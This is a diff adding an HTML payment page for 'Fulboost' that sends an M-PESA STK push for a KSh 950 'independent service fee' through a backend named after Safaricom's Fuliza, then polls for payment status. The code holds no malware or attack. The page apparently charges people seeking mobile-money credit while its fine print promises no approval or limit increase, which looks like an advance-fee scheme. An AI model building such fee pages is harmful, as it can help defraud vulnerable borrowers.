@@ -1,0 +1,598 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Fulboost — Service Fee</title>
+
+<style>
+
+*{
+    box-sizing:border-box;
+}
+
+body{
+    margin:0;
+    padding:15px;
+    background:#0B0217;
+    font-family:Arial,sans-serif;
+    color:#fff;
+}
+
+.container{
+    max-width:430px;
+    margin:auto;
+}
+
+.card{
+    background:
+        linear-gradient(
+            145deg,
+            rgba(255,255,255,.09),
+            rgba(255,255,255,.035)
+        );
+    padding:24px 20px;
+    border-radius:16px;
+    border:1px solid rgba(255,255,255,.10);
+    box-shadow:0 20px 50px rgba(0,0,0,.4);
+}
+
+.logo{
+    display:block;
+    width:85px;
+    height:auto;
+    margin:0 auto 10px;
+}
+
+h2{
+    text-align:center;
+    margin:5px 0 15px;
+    font-size:22px;
+}
+
+.intro{
+    text-align:center;
+    color:rgba(255,255,255,.68);
+    font-size:14px;
+    line-height:1.5;
+}
+
+.details{
+    margin-top:18px;
+    padding:15px;
+    border-radius:12px;
+    background:rgba(255,255,255,.05);
+    border:1px solid rgba(255,255,255,.09);
+}
+
+.details p{
+    margin:9px 0;
+    font-size:14px;
+}
+
+.details b{
+    color:rgba(255,255,255,.9);
+}
+
+.details span{
+    color:#B86CFF;
+    font-weight:700;
+}
+
+.amount{
+    margin-top:18px;
+    padding:16px;
+    text-align:center;
+    border-radius:12px;
+    background:rgba(155,53,255,.10);
+    border:1px solid rgba(155,53,255,.20);
+}
+
+.amount small{
+    display:block;
+    color:rgba(255,255,255,.60);
+    margin-bottom:5px;
+}
+
+.amount strong{
+    font-size:28px;
+    color:#B86CFF;
+}
+
+button{
+    width:100%;
+    margin-top:18px;
+    padding:15px;
+    border:0;
+    border-radius:10px;
+    background:linear-gradient(
+        135deg,
+        #9B35FF,
+        #6C1DCE
+    );
+    color:#fff;
+    font-size:16px;
+    font-weight:700;
+    cursor:pointer;
+}
+
+button:disabled{
+    background:rgba(255,255,255,.22);
+    cursor:not-allowed;
+}
+
+#status{
+    min-height:22px;
+    margin-top:14px;
+    text-align:center;
+    font-size:13px;
+    line-height:1.5;
+    color:rgba(255,255,255,.68);
+}
+
+.notice{
+    margin-top:18px;
+    padding:12px;
+    border-radius:9px;
+    background:rgba(255,255,255,.04);
+    color:rgba(255,255,255,.48);
+    font-size:11px;
+    line-height:1.5;
+    text-align:center;
+}
+
+@media(max-width:360px){
+
+    body{
+        padding:10px;
+    }
+
+    .card{
+        padding:20px 15px;
+    }
+
+    h2{
+        font-size:20px;
+    }
+
+}
+
+</style>
+
+</head>
+
+
+<body>
+
+<div class="container">
+
+<div class="card">
+
+<img
+    src="logo.png"
+    class="logo"
+    alt="Fulboost"
+>
+
+<h2>Service Fee Payment</h2>
+
+<p class="intro">
+    Complete the independent service fee below
+    using your M-PESA phone number.
+</p>
+
+
+<div class="details">
+
+<p>
+    <b>Applicant:</b>
+    <span id="name">Applicant</span>
+</p>
+
+<p>
+    <b>Phone:</b>
+    <span id="phone">Not available</span>
+</p>
+
+</div>
+
+
+<div class="amount">
+
+<small>Independent Service Fee</small>
+
+<strong>KSh 950</strong>
+
+</div>
+
+
+<button
+    id="payBtn"
+    onclick="paySecurity()"
+>
+    Pay KSh 950
+</button>
+
+
+<div id="status"></div>
+
+
+<div class="notice">
+    Fulboost is an independent service and is not
+    affiliated with or endorsed by Safaricom PLC.
+    This payment is for the independent service
+    described on this page and does not guarantee
+    approval, credit, or an increase to any
+    mobile-money account limit.
+</div>
+
+</div>
+
+</div>
+
+
+<script>
+
+const BACKEND =
+    "https://fuliza-backend-1.onrender.com";
+
+
+const FEE = 950;
+
+
+const button =
+    document.getElementById("payBtn");
+
+const statusBox =
+    document.getElementById("status");
+
+
+// ==========================================
+// LOAD CUSTOMER DETAILS
+// ==========================================
+
+const applicantName =
+    localStorage.getItem("applicantName") ||
+    localStorage.getItem("fullName") ||
+    "Applicant";
+
+const savedPhone =
+    localStorage.getItem("phoneNumber") ||
+    sessionStorage.getItem("activationPhone") ||
+    "";
+
+
+document.getElementById("name").textContent =
+    applicantName;
+
+document.getElementById("phone").textContent =
+    savedPhone || "Not available";
+
+
+// ==========================================
+// NORMALIZE KENYAN PHONE
+// ==========================================
+
+function normalizePhone(phone){
+
+    phone = String(phone)
+        .replace(/\s+/g,"");
+
+    if(phone.startsWith("+254")){
+        return phone.substring(1);
+    }
+
+    if(phone.startsWith("0")){
+        return "254" + phone.substring(1);
+    }
+
+    return phone;
+}
+
+
+// ==========================================
+// PAY SERVICE FEE
+// ==========================================
+
+async function paySecurity(){
+
+    if(!savedPhone){
+
+        statusBox.textContent =
+            "Phone number not found. Please return and enter your phone number.";
+
+        return;
+    }
+
+
+    const phone =
+        normalizePhone(savedPhone);
+
+
+    button.disabled = true;
+
+    button.textContent =
+        "Sending STK Push...";
+
+    statusBox.textContent =
+        "Please wait while we send the M-PESA payment request.";
+
+
+    try{
+
+        const response =
+            await fetch(
+                BACKEND + "/stk-push",
+                {
+                    method:"POST",
+
+                    headers:{
+                        "Content-Type":
+                            "application/json"
+                    },
+
+                    body:JSON.stringify({
+
+                        phone:phone,
+
+                        amount:FEE
+
+                    })
+                }
+            );
+
+
+        const data =
+            await response.json();
+
+
+        console.log(
+            "PAYLOR STK RESPONSE:",
+            data
+        );
+
+
+        if(
+            !response.ok ||
+            !data.success
+        ){
+
+            throw new Error(
+                data.message ||
+                "Unable to initiate payment."
+            );
+
+        }
+
+
+        // ==================================
+        // GET PAYLOR TRANSACTION ID
+        // ==================================
+
+        const transactionId =
+            data.transactionId ||
+            data.checkout_request_id ||
+            data.data?.transactionId ||
+            data.data?.checkout_request_id;
+
+
+        if(!transactionId){
+
+            throw new Error(
+                "Paylor did not return a transaction ID."
+            );
+
+        }
+
+
+        sessionStorage.setItem(
+            "fulboostTransactionId",
+            transactionId
+        );
+
+
+        button.textContent =
+            "Waiting for payment...";
+
+
+        statusBox.textContent =
+            "STK Push sent. Please enter your M-PESA PIN. Your payment will be confirmed automatically.";
+
+
+        checkPayment(
+            transactionId
+        );
+
+
+    }catch(error){
+
+        console.error(
+            "PAYLOR STK ERROR:",
+            error
+        );
+
+
+        statusBox.textContent =
+            error.message ||
+            "Payment request failed.";
+
+        button.disabled = false;
+
+        button.textContent =
+            "Pay KSh 950";
+
+    }
+
+}
+
+
+// ==========================================
+// CHECK PAYLOR PAYMENT STATUS
+// ==========================================
+
+function checkPayment(transactionId){
+
+    let attempts = 0;
+
+    const maxAttempts = 40;
+
+
+    const timer =
+        setInterval(
+            async function(){
+
+                attempts++;
+
+
+                if(attempts > maxAttempts){
+
+                    clearInterval(timer);
+
+                    statusBox.textContent =
+                        "Payment confirmation is taking longer than expected. Please check your M-PESA messages before trying again.";
+
+                    button.disabled = false;
+
+                    button.textContent =
+                        "Pay KSh 950";
+
+                    return;
+                }
+
+
+                try{
+
+                    const response =
+                        await fetch(
+                            BACKEND +
+                            "/payment-status",
+                            {
+                                method:"POST",
+
+                                headers:{
+                                    "Content-Type":
+                                        "application/json"
+                                },
+
+                                body:JSON.stringify({
+
+                                    transactionId:
+                                        transactionId
+
+                                })
+                            }
+                        );
+
+
+                    const result =
+                        await response.json();
+
+
+                    console.log(
+                        "PAYLOR PAYMENT STATUS:",
+                        result
+                    );
+
+
+                    if(!response.ok){
+
+                        return;
+                    }
+
+
+                    const paymentStatus =
+                        String(
+                            result.status ||
+                            result.data?.status ||
+                            result.data?.data?.status ||
+                            ""
+                        ).toLowerCase();
+
+
+                    // ==============================
+                    // PAYMENT COMPLETED
+                    // ==============================
+
+                    if(
+                        paymentStatus ===
+                        "completed" ||
+
+                        paymentStatus ===
+                        "success"
+                    ){
+
+                        clearInterval(timer);
+
+
+                        statusBox.textContent =
+                            "Payment successful. Redirecting...";
+
+
+                        setTimeout(
+                            function(){
+
+                                window.location.href =
+                                    "status.html";
+
+                            },
+                            1000
+                        );
+
+
+                        return;
+                    }
+
+
+                    // ==============================
+                    // PAYMENT FAILED
+                    // ==============================
+
+                    if(
+                        paymentStatus ===
+                        "failed" ||
+
+                        paymentStatus ===
+                        "cancelled"
+                    ){
+
+                        clearInterval(timer);
+
+
+                        statusBox.textContent =
+                            "Payment " +
+                            paymentStatus +
+                            ".";
+
+
+                        button.disabled =
+                            false;
+
+                        button.textContent =
+                            "Pay KSh 950";
+
+                    }
+
+
+                }catch(error){
+
+                    console.error(
+                        "PAYLOR STATUS ERROR:",
+                        error
+                    );
+
+                }
+
+            },
+            3000
+        );
+
+}
+
+</script>
+
+</body>
+
+  </html>
